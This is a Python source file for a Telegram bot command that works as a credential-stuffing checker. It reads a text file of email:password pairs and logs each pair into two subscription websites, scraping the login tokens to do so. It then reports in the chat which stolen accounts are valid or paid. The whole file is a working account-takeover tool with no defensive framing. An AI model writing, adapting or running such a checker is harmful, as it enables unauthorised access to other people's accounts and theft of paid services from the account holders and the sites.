import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
# import bs4
from pyrogram import Client, filters
import json

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

@Client.on_message(filters.command(["hot", "make"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def gen(Client , message):
    try:
        if message.reply_to_message:
            if message.reply_to_message.document:
                if message.reply_to_message.document.file_name.endswith(".txt"):
                    await message.reply_to_message.download("accounts.txt")
                    time.sleep(3)
                    await message.reply_text("Downloading file...")
                    with open("downloads/accounts.txt", "r") as f:
                        for line in f:
                            if not line.strip():
                                break
                            else:
                                email,password = line.split(":")
                                password = password.strip()
                                email = email.strip()
                                r = requests.session()
                                a = r.get("https://fliz.in/login")
                                token = find_between(a.text, 'name="_token" type="hidden" value="', '"')
                                data = {
                                "_token": token,
                                "email": email,
                                "password": password
                                }
                                b = r.post("https://fliz.in/login", data=data)
                                print(email+":"+password)
                                if "The email or the password is invalid. Please try again." in b.text:
                                            fliz = "FALSE"
                                elif "Logout" in b.text:
                                    if "Current Plan" in b.text:
                                        fliz = "TRUE"
                                    else:
                                        fliz = "Free"

                                c = r.get('https://hotx.vip/login')
                                token = find_between(c.text, 'name="_token" value="', '"')
                                data = {
                                "_token": token,
                                "email": email,
                                "password": password
                                }
                                d = r.post('https://hotx.vip/login', data=data)
                                if "These credentials do not match our records." in d.text:
                                    hot = "FALSE"
                                elif "Logout" in d.text:
                                    if "Current Plan" in d.text:
                                        hot = "TRUE"
                                    else:
                                        hot = "FREE"
                                if(fliz == "TRUE" and hot == "TRUE"):
                                    await message.reply_text("Email: "+email+" Password: "+password+" \nFliz: "+fliz+" \nHot: "+hot)
                                elif(fliz == "TRUE" and hot == "FALSE"):
                                    await message.reply_text("Email: "+email+" Password: "+password+" \nFliz: "+fliz+" \nHot: "+hot)
                                elif(fliz == "FALSE" and hot == "TRUE"):
                                    await message.reply_text("Email: "+email+" Password: "+password+" \nFliz: "+fliz+" \nHot: "+hot)
                                elif(fliz == "FALSE" and hot == "FALSE"):
                                    print("Invalid Account")



                    await message.reply_text("Done")
                else:
                    await message.reply_text("Please reply to a .txt file")

                    
    except Exception as e:
        print(e)